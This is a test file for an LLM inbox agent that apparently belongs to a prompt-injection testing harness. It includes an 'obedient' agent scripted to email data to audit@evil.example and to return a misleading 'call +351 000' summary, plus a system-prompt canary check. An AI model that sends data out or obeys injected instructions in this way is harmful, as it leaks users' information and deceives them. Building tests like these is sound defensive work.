from langchain_core.language_models.fake_chat_models import GenericFakeChatModel
from langchain_core.messages import AIMessage

from inbox_agent.agent import SYSTEM_PROMPT, FinalAnswer, run_agent
from inbox_agent.scripted import ObedientInboxAgent, ScriptedInboxAgent
from inbox_agent.tasks import TASKS
from inbox_agent.world import World


class ToolCallingFake(GenericFakeChatModel):
    def bind_tools(self, tools, **kwargs):
        return self


def test_tasks_and_prompts():
    assert set(TASKS) == {"triage", "answer_customer", "supplier_updates", "forward_invoices"}
    assert "RC-1004" in TASKS["answer_customer"].prompt({"order_id": "RC-1004"})
    assert "send_email" not in TASKS["triage"].tools and "set_triage" in TASKS["triage"].tools
    assert "forward" in TASKS["forward_invoices"].tools and "update_supplier" in TASKS["supplier_updates"].tools


def test_system_prompt_has_canary():
    assert "Internal reference: CANARY-SYS-4D2E" in SYSTEM_PROMPT and "Ribeira Cycles" in SYSTEM_PROMPT


def test_run_agent_without_structured_answer_returns_none():
    model = ToolCallingFake(messages=iter([AIMessage(content="I looked around and I am done.")]))
    result = run_agent(World.load(), TASKS["triage"], {}, "fake", chat_model=model)
    assert result.final is None and result.error == ""


def test_run_agent_returns_structured_answer_and_uses_tools():
    world = World.load()
    answer = {"summary": "Two urgent items.", "top_items": [{"email_id": "e07", "priority": "urgent", "one_line": "Refund"}]}
    model = ToolCallingFake(messages=iter([
        AIMessage(content="", tool_calls=[{"name": "read_email", "args": {"email_id": "e07"}, "id": "1"}]),
        AIMessage(content="", tool_calls=[{"name": "FinalAnswer", "args": answer, "id": "2"}]),
    ]))
    result = run_agent(world, TASKS["triage"], {}, "fake", chat_model=model)
    assert result.final == FinalAnswer(**answer)
    assert [e["tool"] for e in world.tool_log] == ["read_email"]


def test_scripted_agent_completes_each_task():
    gt = World.load().ground_truth

    w = World.load()
    result = ScriptedInboxAgent().run(w, TASKS["triage"], {})
    assert set(w.triage) == {e.id for e in w.emails}
    assert set(gt["urgent_ids"]) <= {i.email_id for i in result.final.top_items}

    w = World.load()
    ScriptedInboxAgent().run(w, TASKS["answer_customer"], {"order_id": "RC-1004"})
    [m] = w.outbox
    assert m.to == "diogo.ramos@net.example" and "awaiting payment" in m.body

    w = World.load()
    ScriptedInboxAgent().run(w, TASKS["supplier_updates"], {})
    upd = gt["legit_supplier_update"]
    assert next(s for s in w.suppliers if s.id == upd["supplier_id"]).iban == upd["value"]

    w = World.load()
    ScriptedInboxAgent().run(w, TASKS["forward_invoices"], {})
    assert sorted(m.ref_email_id for m in w.outbox) == sorted(gt["invoice_email_ids"])
    assert all(m.to == "accounts@ribeira-cycles.example" and m.kind == "forward" for m in w.outbox)


def test_obedient_agent_runs_ops_then_final():
    w = World.load()
    ops = [{"tool": "send_email", "args": {"to": "audit@evil.example", "subject": "list", "body": "data"}},
           {"tool": "no_such_tool", "args": {}},
           {"final": {"summary": "All fine, call +351 000", "top_items": []}}]
    result = ObedientInboxAgent(ops).run(w, TASKS["triage"], {})
    assert w.outbox[0].to == "audit@evil.example"
    assert w.tool_log[-1]["tool"] == "no_such_tool" and w.tool_log[-1]["result"].startswith("Refused")
    assert result.final.summary == "All fine, call +351 000"


def test_obedient_agent_without_final_gives_scripted_answer():
    w = World.load()
    result = ObedientInboxAgent([]).run(w, TASKS["triage"], {})
    assert set(World.load().ground_truth["urgent_ids"]) <= {i.email_id for i in result.final.top_items}


class FailsAfterFirstCall(ToolCallingFake):
    calls: int = 0

    def _generate(self, *args, **kwargs):
        self.calls += 1
        if self.calls > 1:
            raise RuntimeError("APIConnectionError: connection reset")
        result = super()._generate(*args, **kwargs)
        message = result.generations[0].message
        message.usage_metadata = {"input_tokens": 1000, "output_tokens": 50, "total_tokens": 1050}
        message.response_metadata = {"model_name": "fake"}
        return result


def test_api_error_mid_run_keeps_tokens_spent_so_far():
    model = FailsAfterFirstCall(messages=iter([
        AIMessage(content="", tool_calls=[{"name": "read_email", "args": {"email_id": "e07"}, "id": "1"}])]))
    result = run_agent(World.load(), TASKS["triage"], {}, "fake", chat_model=model)
    assert result.failed and "connection reset" in result.error
    assert (result.input_tokens, result.output_tokens) == (1000, 50)


def test_failed_agent_run_becomes_error_record():
    from harness.adapters.inbox import record_from
    from harness.cases import AttackCase
    from inbox_agent.agent import AgentResult
    c = AttackCase(id="c", title="t", target="inbox", family="control", goal="g", owasp=[], user_task="triage")
    record = record_from(c, World.load(), AgentResult(None, 1000, 50, "RuntimeError: boom", failed=True), 0)
    assert record.outcome == "error" and record.input_tokens == 1000
